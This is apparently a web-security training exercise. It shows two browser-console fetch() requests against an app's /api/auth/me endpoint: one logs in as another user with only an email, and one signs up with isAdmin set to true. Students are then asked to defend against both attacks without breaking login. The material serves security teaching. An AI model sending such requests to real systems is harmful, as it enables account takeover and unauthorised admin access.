## The Attack

It is possible to login with just an email. For example, you could run this in the browser console to log in as Zeke (after submitting, refresh the page):

```js
fetch('/api/auth/me', {
  method: 'PUT',
  headers: new Headers({
    'Content-Type': 'application/json'
  }),
  body: JSON.stringify({
    email: 'zeke@zeke.zeke'
  }),
  credentials: 'same-origin'
});
```

Similarly you can set your privilege level as "admin" when signup up by doing something like:

```js
fetch('/api/auth/me', {
  method: 'POST',
  headers: new Headers({
    'Content-Type': 'application/json'
  }),
  body: JSON.stringify({
    email: 'voldemort@hogwarts.edu',
    isAdmin: true
  }),
  credentials: 'same-origin'
});
```

## Try to Defend

Gain one point each for making the above attacks impossible. Remember not to break login or signup: lose one point if at the end of you machinations, ordinary login or signup does not work anymore.

<guide>
The instructor has said it's time to go onto the next exercise
</guide>